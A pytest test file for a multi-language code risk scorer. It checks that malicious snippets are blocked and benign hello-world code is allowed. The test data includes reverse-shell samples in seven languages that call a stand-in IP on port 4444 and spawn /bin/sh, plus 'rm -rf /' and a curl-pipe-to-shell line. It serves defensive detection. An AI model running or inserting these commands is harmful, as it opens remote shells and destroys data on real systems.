import pytest

from backend.risk import Thresholds, score
from backend.risk.engine import ml_score_from_proba, score_code
from backend.risk.features import FEATURE_NAMES, extract
from backend.risk.rules import SUPPORTED_LANGUAGES, get_ruleset

MALICIOUS = {
    "python": "import socket,os,pty\ns=socket.socket()\ns.connect(('203.0.113.9',4444))\nos.dup2(s.fileno(),0)\npty.spawn('/bin/sh')\n",
    "javascript": "const net=require('net');const cp=require('child_process');\nconst s=new net.Socket();s.connect(4444,'203.0.113.9',()=>{const sh=cp.spawn('/bin/sh',[]);});\n",
    "go": 'package main\nimport ("net";"os/exec")\nfunc main(){c,_:=net.Dial("tcp","203.0.113.9:4444");cmd:=exec.Command("/bin/sh");_ = c;_ = cmd}\n',
    "java": 'import java.net.*;\nclass A{public static void main(String[] a)throws Exception{Socket s=new Socket("203.0.113.9",4444);new ProcessBuilder("/bin/sh").start();}}\n',
    "c": '#include <unistd.h>\nint main(){int s=socket(AF_INET,SOCK_STREAM,0);dup2(s,0);execve("/bin/sh",0,0);}\n',
    "cpp": '#include <unistd.h>\nint main(){int s=socket(AF_INET,SOCK_STREAM,0);dup2(s,0);execve("/bin/sh",0,0);}\n',
    "rust": 'use std::net::TcpStream;use std::process::Command;\nfn main(){let _s=TcpStream::connect("203.0.113.9:4444");Command::new("/bin/sh").spawn().unwrap();}\n',
}
BENIGN = {
    "python": "def fib(n):\n    a, b = 0, 1\n    for _ in range(n):\n        a, b = b, a + b\n    return a\nprint(fib(10))\n",
    "javascript": "const xs=[1,2,3];\nconsole.log(xs.map(x=>x*2));\n",
    "go": 'package main\nimport "fmt"\nfunc main(){fmt.Println("hi")}\n',
    "java": 'class A{public static void main(String[] a){System.out.println("hi");}}\n',
    "c": '#include <stdio.h>\nint main(){printf("hi\\n");return 0;}\n',
    "cpp": '#include <iostream>\nint main(){std::cout<<"hi";}\n',
    "rust": 'fn main(){println!("hi");}\n',
}


def test_all_seven_languages_have_rules():
    assert set(SUPPORTED_LANGUAGES) == {"python", "javascript", "java", "c", "cpp", "go", "rust"}
    for lang in SUPPORTED_LANGUAGES:
        assert len(get_ruleset(lang)[0]) > 24


@pytest.mark.parametrize("lang", sorted(MALICIOUS))
def test_reverse_shells_are_blocked(lang):
    r = score(MALICIOUS[lang], lang)
    assert r.decision == "block", (lang, r.score, [f.rule_id for f in r.findings])


@pytest.mark.parametrize("lang", sorted(BENIGN))
def test_benign_hello_world_allowed(lang):
    r = score(BENIGN[lang], lang)
    assert r.decision == "allow" and r.score < 40, (lang, r.score)


def test_common_rules_apply_to_unknown_language():
    assert score("rm -rf /\n", "brainfuck").decision == "block"
    assert score("curl http://x.test/a.sh | sh\n", "bash").decision == "block"


def test_rm_rf_only_matches_root_like_targets():
    assert score("os.system('rm -rf /tmp/build')", "python").score < 40
    assert score("os.system('rm -rf /')", "python").decision in ("flag", "block")


def test_comment_lines_ignored_but_trailing_comments_scanned():
    assert score("# os.system('ls')\nx = 1\n", "python").score == 0
    assert score("x = 1  # not skipped\nos.system('ls')  # ok\n", "python").score > 0


def test_aliases_and_line_numbers():
    r = score("x = 1\ny = 2\neval(input())\n", "py")
    assert r.language == "python"
    f = next(f for f in r.findings if f.rule_id == "py.exec_eval")
    assert f.line == 3 and f.snippet == "eval(input())"


def test_thresholds_change_decision():
    code = "import os\nos.system('ls')\nos.system('pwd')\n"
    base = score(code, "python")
    strict = score(code, "python", Thresholds(flag=5, block=20))
    assert base.score == strict.score
    assert strict.decision == "block" and base.decision == "allow"
    with pytest.raises(ValueError):
        Thresholds(flag=90, block=10)


def test_oversized_input_is_flagged_and_fast():
    r = score("a = 1\n" * 200_000, "python")
    assert r.truncated and any(f.rule_id == "common.oversized_input" for f in r.findings)
    assert r.latency_ms < 2000


def test_features_shape_and_empty_input():
    assert len(extract("")) == len(FEATURE_NAMES)
    assert len(extract("import os\nos.system('x')\n")) == len(FEATURE_NAMES)


def test_engine_falls_back_to_rules_without_model(tmp_path):
    r = score_code(MALICIOUS["python"], "python", model_path=str(tmp_path / "missing.joblib"))
    assert r.model == "rules" and r.fallback_reason and r.decision == "block"
    r2 = score_code(BENIGN["go"], "go")
    assert r2.fallback_reason == "ml_python_only"


def test_ml_score_mapping_lands_best_f1_threshold_on_flag():
    assert ml_score_from_proba(0.3, 0.3, 40) == 40
    assert ml_score_from_proba(0.0, 0.3, 40) == 0
    assert ml_score_from_proba(1.0, 0.3, 40) == 100
